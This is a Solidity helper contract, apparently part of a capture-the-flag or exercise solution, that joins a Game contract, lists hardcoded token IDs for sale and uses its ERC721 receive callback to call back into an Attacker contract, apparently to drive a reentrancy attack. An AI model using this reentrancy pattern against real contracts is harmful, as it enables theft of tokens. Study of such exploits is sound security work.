// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Game.sol";
import "./Attacker.sol";

contract Feeder is IERC721Receiver
{
    Game public game;
    Attacker atk; 
    constructor(address _game)
    {
        atk = Attacker(msg.sender);

        game = Game(_game);
        game.join();

        if (game.totalSupply() == 9)
        {
            game.putUpForSale(6);
            game.putUpForSale(7);
            game.putUpForSale(8);
        }
        else if (game.totalSupply() == 12)
        {
            game.putUpForSale(9);
            game.putUpForSale(10);
            game.putUpForSale(11);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        atk.getNext();
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}